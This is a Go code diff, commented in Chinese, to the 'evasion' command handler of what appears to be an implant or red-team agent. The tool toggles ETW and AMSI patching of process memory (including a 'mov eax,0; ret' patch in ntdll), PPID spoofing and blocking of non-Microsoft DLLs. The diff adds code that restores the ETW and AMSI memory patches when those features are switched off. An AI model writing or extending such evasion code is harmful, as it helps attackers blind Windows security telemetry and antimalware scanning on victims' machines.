@@ -3,6 +3,7 @@
 package commands
 
 import (
+	"errors"
 	"fmt"
 	"strings"
 
@@ -63,6 +64,20 @@ func EvasionControl(cmdBuf []byte) ([]byte, error) {
 	return nil, fmt.Errorf("用法: evasion [status|reset|all on|off|on <能力>|off <能力>]")
 }
 
+// revocableTag 返回该能力在 patch 台账里的标签。
+// 只有真正往进程内存里写过字节的能力才有 tag —— 其余能力（PPID 伪造、
+// 禁非微软 DLL 等）作用于子进程或一次性动作，没有可撤销的进程内补丁。
+func revocableTag(key config.EvasionKey) (string, bool) {
+	switch key {
+	case config.EvasionETW:
+		return evasion.TagETW, true
+	case config.EvasionAMSI:
+		return evasion.TagAMSI, true
+	default:
+		return "", false
+	}
+}
+
 // parseEvasionKey 解析能力名，容忍 block_dlls / block-dlls / blockdlls 三种写法
 // （前端、文档、口头叫法不一致时不该逼运维去查拼写）。
 func parseEvasionKey(raw string) (config.EvasionKey, bool) {
@@ -104,8 +119,31 @@ func applyEvasionKey(key config.EvasionKey, on bool) string {
 		return fmt.Sprintf("⚠️ %s: %v", key, err)
 	}
 	if !on {
-		// 关闭不需要额外动作：各调用点每次使用都会重新读开关。
-		return fmt.Sprintf("✅ %s: 运行期已关闭（下次使用即生效；已发生的动作不撤销）", key)
+		// 关闭除了翻配置，还要**撤掉已经打进内存的补丁**（阶段四）。
+		// 改造前这里只翻开关：ETW 的 `mov eax,0; ret` 留在 ntdll 里，
+		// 所以"关掉"只是不再主动打补丁，已生效的仍然生效 —— 运维看到
+		// "已关闭"却测到遥测仍然被屏蔽，很难理解。
+		if tag, ok := revocableTag(key); ok {
+			rep, rerr := evasion.RestorePatchesByTag(tag)
+			switch {
+			case errors.Is(rerr, evasion.ErrNoPatches):
+				return fmt.Sprintf("✅ %s: 运行期已关闭（本次运行内没有打过补丁，无需撤销）", key)
+			case rerr != nil:
+				return fmt.Sprintf("⚠️ %s: 运行期已关闭，但撤销补丁失败 — %v", key, rerr)
+			}
+			var lines []string
+			for _, t := range rep.Targets {
+				lines = append(lines, t.String())
+			}
+			head := fmt.Sprintf("✅ %s: 运行期已关闭，已还原 %d 个补丁入口（跳过 %d）",
+				key, rep.Restored(), rep.Skipped())
+			if len(lines) == 0 {
+				return head
+			}
+			return head + "\n    " + strings.Join(lines, "\n    ")
+		}
+		// 其余能力没有进程内补丁可撤（只翻开关即可，各调用点每次使用都会重读）
+		return fmt.Sprintf("✅ %s: 运行期已关闭（下次使用即生效）", key)
 	}
 	switch key {
 	case config.EvasionETW:
